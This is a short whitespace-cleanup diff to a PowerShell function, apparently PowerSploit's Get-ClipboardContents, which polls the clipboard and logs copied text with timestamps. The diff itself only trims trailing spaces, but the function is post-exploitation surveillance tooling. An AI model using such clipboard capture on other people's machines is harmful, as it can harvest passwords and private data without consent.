@@ -1,7 +1,7 @@
 function Get-ClipboardContents {
 <#
 .SYNOPSIS
- 
+
 Monitors the clipboard on a specified interval for changes to copied text.
 
 PowerSploit Function: Get-ClipboardContents
@@ -72,7 +72,7 @@ http://brianreiter.org/2010/09/03/copy-and-paste-with-clipboard-from-powershell/
                     "`n=== $TimeStamp ===`n"
                     $tb.Text
                     $PrevFirstChar = ($tb.Text)[0]
-                    $PrevLength = $tb.Text.Length 
+                    $PrevLength = $tb.Text.Length
                 }
             }
         }
